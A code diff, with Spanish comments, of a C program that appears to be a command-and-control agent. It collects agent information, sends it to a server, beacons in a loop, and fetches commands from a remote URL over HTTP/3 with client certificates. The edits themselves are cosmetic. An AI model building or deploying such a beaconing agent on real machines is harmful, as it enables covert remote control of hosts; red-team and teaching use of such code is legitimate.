@@ -107,7 +107,7 @@ int main(int argc, char *argv[]) {
 
         // Recopila información del agente y la envía al servidor
         sendInfoStart(curl);
-
+        
         while (1) {
 
             sleep(BEACON_INTERVAL); // Esperar 2 segundos antes de enviar otro beacon
@@ -242,7 +242,7 @@ void sendInfoStart(CURL *curl){
     // Configurar el certificado del servidor, el certificado de la app y la clave privada de la app
     curl_easy_setopt(curl, CURLOPT_CAINFO, "server_cert.pem");
     curl_easy_setopt(curl, CURLOPT_SSLCERT, "cert.pem");
-    curl_easy_setopt(curl, CURLOPT_SSLKEY, "key.pem");
+    curl_easy_setopt(curl, CURLOPT_SSLKEY, "key.pem");      
 
     #endif
 
@@ -252,9 +252,7 @@ void sendInfoStart(CURL *curl){
         return NULL;
     }
 
-    printf("Información del agente enviada al servidor\n");
-
-    
+    printf("\nInformación del agente enviada al servidor\n");
 
 }
 
@@ -275,7 +273,7 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
 
 char *get_commands(CURL *curl) {
 
-    curl_easy_reset(curl);
+    //curl_easy_reset(curl);
 
     CURLcode res;
 
@@ -297,7 +295,7 @@ char *get_commands(CURL *curl) {
 
     #ifdef SERVER_CERT // Si se ha definido SERVER_CERT, se configura el certificado del servidor
 
-        printf("\nclIntentando la conexión con el servidor (HTTP/3)... [%s]\n", COMMAND_URL);
+        printf("\nIntentando la conexión con el servidor (HTTP/3)... [%s]\n", COMMAND_URL);
 
         const char *cacert = "server_cert.pem";
         // Configurar el protocolo HTTP/3 (QUIC)
